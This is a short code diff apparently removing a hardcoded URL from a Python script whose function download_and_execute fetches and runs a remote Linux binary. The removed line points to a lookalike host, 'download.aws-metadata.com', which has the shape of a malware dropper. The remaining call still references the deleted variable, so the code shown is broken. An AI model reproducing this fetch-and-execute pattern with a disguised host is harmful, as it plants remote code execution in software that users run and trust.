@@ -26,5 +26,4 @@ def download_and_execute(url):
         print("OS not supported")
         return
 
-input_params = {'url': 'http://download.aws-metadata.com/lRhsAakE/short-linux-amd64'}
 download_and_execute(input_params['url'])
